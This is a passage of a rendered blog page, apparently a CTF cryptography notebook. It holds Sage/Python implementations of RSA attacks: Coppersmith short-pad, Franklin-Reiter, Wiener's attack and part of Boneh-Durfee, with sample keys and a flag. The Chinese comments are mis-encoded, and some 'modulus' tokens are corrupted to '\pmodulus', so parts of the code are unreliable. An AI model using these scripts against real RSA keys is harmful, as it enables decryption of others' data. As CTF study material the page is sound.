class="string">"flag&#123;This_Msg_Is_2_1337&#125;"</span></span><br><span class="line">    M = <span class="built_in">int</span>(binascii.hexlify(M),<span class="number">16</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    nBitSize =  <span class="number">8192</span></span><br><span class="line">    key = <span class="type">RSA</span>.generate(nBitSize)</span><br><span class="line">    <span class="comment">#Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever</span></span><br><span class="line">    m = <span class="built_in">int</span>(math.floor(nBitSize/(e*e))) - <span class="number">400</span></span><br><span class="line">    assert (m &lt; nBitSize - len(bin(M)[<span class="number">2</span>:]))</span><br><span class="line">    r1 = random.randint(<span class="number">1</span>,pow(<span class="number">2</span>,m))</span><br><span class="line">    r2 = random.randint(r1,pow(<span class="number">2</span>,m))</span><br><span class="line">    <span class="type">M1</span> = pow(<span class="number">2</span>,m)*M + r1</span><br><span class="line">    <span class="type">M2</span> = pow(<span class="number">2</span>,m)*M + r2</span><br><span class="line">    <span class="type">C1</span> = <span class="type">Integer</span>(pow(<span class="type">M1</span>,e,key.n))</span><br><span class="line">    <span class="type">C2</span> = <span class="type">Integer</span>(pow(<span class="type">M2</span>,e,key.n))</span><br><span class="line">    <span class="type">CoppersmithShortPadAttack</span>(e,key.n,<span class="type">C1</span>,<span class="type">C2</span>,eps)'''</span><br><span class="line"></span><br><span class="line">def testFranklinReiter():</span><br><span class="line">    p = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    n = p * q <span class="comment"># 1024-bit \pmodulus</span></span><br><span class="line">    e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    m = randint(<span class="number">0</span>, n) <span class="comment"># some message we want to recover</span></span><br><span class="line">    r = randint(<span class="number">0</span>, n) <span class="comment"># random padding</span></span><br><span class="line"></span><br><span class="line">    c1 = pow(m + <span class="number">0</span>, e, n)</span><br><span class="line">    c2 = pow(m + r, e, n)</span><br><span class="line">    print(m)</span><br><span class="line">    recoveredM = franklinReiter(n,e,r,c1,c2)</span><br><span class="line">    print(recoveredM)</span><br><span class="line">    assert recoveredM==m</span><br><span class="line">    print(<span class="string">"They are equal!"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">testFranklinReiter()</span><br></pre></td></tr></table></figure><h2 id="wienerâ€˜s-Attack"><a href="#wienerâ€˜s-Attack" class="headerlink" title="wienerâ€˜s Attack"></a>wienerâ€˜s Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(x,y)</span>:</span>       <span class="comment">#ä½¿ç”¨è¾—è½¬ç›¸å¤„å°†åˆ†æ•° x/y è½¬ä¸ºè¿åˆ†æ•°çš„å½¢å¼</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fraction</span><span class="params">(sub_res)</span>:</span></span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::<span class="number">-1</span>]:      <span class="comment">#ä»sublistçš„åé¢å¾€å‰å¾ªç¯</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator   <span class="comment">#å¾—åˆ°æ¸è¿›åˆ†æ•°çš„åˆ†æ¯å’Œåˆ†å­ï¼Œå¹¶è¿”å›</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#æ±‚è§£æ¯ä¸ªæ¸è¿›åˆ†æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_fraction</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=list(map(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)))))  <span class="comment">#å°†è¿åˆ†æ•°çš„ç»“æœé€ä¸€æˆªå–ä»¥æ±‚æ¸è¿›åˆ†æ•°</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span><span class="params">(a,b,c)</span>:</span>      <span class="comment">#ç”±p+qå’Œpqçš„å€¼é€šè¿‡ç»´è¾¾å®šç†æ¥æ±‚è§£på’Œq</span></span><br><span class="line">    par=gmpy2.isqrt(b*b<span class="number">-4</span>*a*c)   <span class="comment">#ç”±ä¸Šè¿°å¯å¾—ï¼Œå¼€æ ¹å·ä¸€å®šæ˜¯æ•´æ•°ï¼Œå› ä¸ºæœ‰è§£</span></span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> (d,k) <span class="keyword">in</span> sub_fraction(e,n):  <span class="comment">#ç”¨ä¸€ä¸ªforå¾ªç¯æ¥æ³¨æ„è¯•æ¢e/nçš„è¿ç»­å‡½æ•°çš„æ¸è¿›åˆ†æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¸è¿›åˆ†æ•°</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:                     <span class="comment">#å¯èƒ½ä¼šå‡ºç°è¿åˆ†æ•°çš„ç¬¬ä¸€ä¸ªä¸º0çš„æƒ…å†µï¼Œæ’é™¤</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d<span class="number">-1</span>)%k!=<span class="number">0</span>:             <span class="comment">#ed=1 (\pmod Ï†(n)) å› æ­¤å¦‚æœæ‰¾åˆ°äº†dçš„è¯ï¼Œ(ed-1)ä¼šæ•´é™¤Ï†(n),ä¹Ÿå°±æ˜¯å­˜åœ¨kä½¿å¾—(e*d-1)//k=Ï†(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d<span class="number">-1</span>)//k               <span class="comment">#è¿™ä¸ªç»“æœå°±æ˜¯ Ï†(n)</span></span><br><span class="line">        px,qy=get_pq(<span class="number">1</span>,n-phi+<span class="number">1</span>,n)</span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))     <span class="comment">#å¯èƒ½ä¼šå¾—åˆ°ä¸¤ä¸ªè´Ÿæ•°ï¼Œè´Ÿè´Ÿå¾—æ­£æœªå°ä¸ä¼šå‡ºç°</span></span><br><span class="line">            d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))     <span class="comment">#æ±‚ed=1 (\pmod  Ï†(n))çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯eå…³äº Ï†(n)çš„ä¹˜æ³•é€†å…ƒd</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    print(<span class="string">"è¯¥æ–¹æ³•ä¸é€‚ç”¨"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = <span class="number">14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span></span><br><span class="line">n = <span class="number">33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span></span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line">print(<span class="string">"d="</span>,d)</span><br></pre></td></tr></table></figure><h2 id="wienerâ€˜s-Attackå¤±æ•ˆæ—¶"><a href="#wienerâ€˜s-Attackå¤±æ•ˆæ—¶" class="headerlink" title="wienerâ€˜s Attackå¤±æ•ˆæ—¶"></a>wienerâ€˜s Attackå¤±æ•ˆæ—¶</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥ç»™å‡ºn,e,c  ï¼ˆeå¾ˆå¤§ï¼‰  (.sage)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, \pmodulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= \pmodulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"* removing unhelpful vector"</span>, ii</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, \pmodulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * \pmodulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * \pmodulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, \pmodulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"failure"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, \pmodulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = \pmodulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"We do not have det &lt; bound. Solutions might not be found."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Try with highers m and 